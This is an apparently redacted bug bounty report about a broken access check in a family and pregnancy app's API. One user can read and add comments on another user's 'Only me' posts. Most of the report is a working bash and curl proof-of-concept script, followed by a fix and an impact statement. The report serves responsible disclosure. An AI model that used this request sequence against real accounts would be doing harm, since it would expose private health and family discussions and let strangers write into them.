## Vulnerability Details

## Summary

████████ correctly returns `404` when account A requests another user's
`readPrivacy=4` post through `/storypost`, but the same bearer token can retrieve
the private comments through `/getcomments` and insert comments through
`/addcomment`.

This exposes private family/health discussions and lets unrelated users write
into “Only me” threads.

## Full reproduction

Precondition: two unrelated ████████ accounts that completed normal onboarding,
A and B. Account B has comments enabled and uses the most restrictive read setting:
`readPrivacy=4` (`Bara jag/min partner`, Only me/my partner).

```bash
#!/usr/bin/env bash
set -euo pipefail

API='https://████████/████████-mobile/v1/ClubApp.ful/api'
ROOT="$API/v1"

A_EMAIL='attacker@example.test'
A_PASSWORD='<A_PASSWORD>'
B_EMAIL='victim@example.test'
B_PASSWORD='<B_PASSWORD>'

COMMON=(
  -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
  -H 'X-HackerOne-Research: matty69v'
  -H 'Accept: */*'
  -H 'Ocp-Apim-Subscription-Key: ████████'
  -H 'X-MarketKey: ████████.se'
  -H 'Content-Type: application/json'
)

A_BODY=$(jq -nc --arg e "$A_EMAIL" --arg p "$A_PASSWORD" \
  '{Email:$e,Password:$p}')
B_BODY=$(jq -nc --arg e "$B_EMAIL" --arg p "$B_PASSWORD" \
  '{Email:$e,Password:$p}')

A_LOGIN=$(curl -sS "$ROOT/members/login" "${COMMON[@]}" --data "$A_BODY")
B_LOGIN=$(curl -sS "$ROOT/members/login" "${COMMON[@]}" --data "$B_BODY")

A_TOKEN=$(printf '%s' "$A_LOGIN" | jq -r '.authentication.logintoken')
B_TOKEN=$(printf '%s' "$B_LOGIN" | jq -r '.authentication.logintoken')
B_FAMILY=$(printf '%s' "$B_LOGIN" | jq -r '.userDetails.familyDetails.familyId')

echo '[1] B sets Only me'
curl -sS -X POST \
  "$API/v2/settings/setreadprivacysettings?familyId=$B_FAMILY&readPrivacy=4" \
  "${COMMON[@]}" -H "Authorization: Bearer $B_TOKEN"
echo

echo '[2] B enables comments'
curl -sS -X POST \
  "$ROOT/settings/setallowcommentsandlikes?familyId=$B_FAMILY&allowCommentsAndLikes=True" \
  "${COMMON[@]}" -H "Authorization: Bearer $B_TOKEN"
echo

DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ')
POST_BODY=$(jq -nc --arg d "$DATE" --argjson f "$B_FAMILY" \
  '{Text:"matty69v-private-post-proof",Subject:"",FamilyId:$f,TagUsers:[],MilestoneId:null,MilestoneFamilyMemberProfileId:null,Date:$d,StoryPostMedias:[]}')
POST=$(curl -sS "$ROOT/addpost" "${COMMON[@]}" \
  -H "Authorization: Bearer $B_TOKEN" --data "$POST_BODY")
POST_ID=$(printf '%s' "$POST" | jq -r '.internalMessage | capture("post (?<id>[0-9]+)").id')

echo '[3] B creates the private post'
printf '%s\n' "$POST"

echo '[4] B adds a private comment'
curl -sS -X POST "$ROOT/addcomment?parentPostId=$POST_ID" "${COMMON[@]}" \
  -H "Authorization: Bearer $B_TOKEN" \
  --data '{"Comment":"matty69v-private-comment-B-proof"}'
echo 'HTTP 200'

echo '[5] A cannot read the private post'
curl -sS -w '\nHTTP %{http_code}\n' \
  "$ROOT/storypost?postId=$POST_ID" "${COMMON[@]}" \
  -H "Authorization: Bearer $A_TOKEN"

echo '[6] A reads B private comment anyway'
curl -sS -w '\nHTTP %{http_code}\n' \
  "$ROOT/getcomments?postId=$POST_ID" "${COMMON[@]}" \
  -H "Authorization: Bearer $A_TOKEN"

echo '[7] A writes into B private post'
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' -X POST \
  "$ROOT/addcomment?parentPostId=$POST_ID" "${COMMON[@]}" \
  -H "Authorization: Bearer $A_TOKEN" \
  --data '{"Comment":"matty69v-foreign-comment-A-proof"}'

echo '[8] B sees A comment in the Only me thread'
curl -sS -w '\nHTTP %{http_code}\n' \
  "$ROOT/getcomments?postId=$POST_ID" "${COMMON[@]}" \
  -H "Authorization: Bearer $B_TOKEN"
```

## Fix

Authorize the parent post before reading or writing comments. `/getcomments`
and `/addcomment` must use the same `canViewPost(currentUser, postId)` check as
`/storypost`, and writes must additionally require comments to be enabled.

## Impact

Any authenticated ████████ user can obtain private comment text and commenter
metadata from posts they cannot access, and can inject comments into another
user's private thread. Because comments are part of a pregnancy/████████/family
community, they may contain sensitive health and child information.
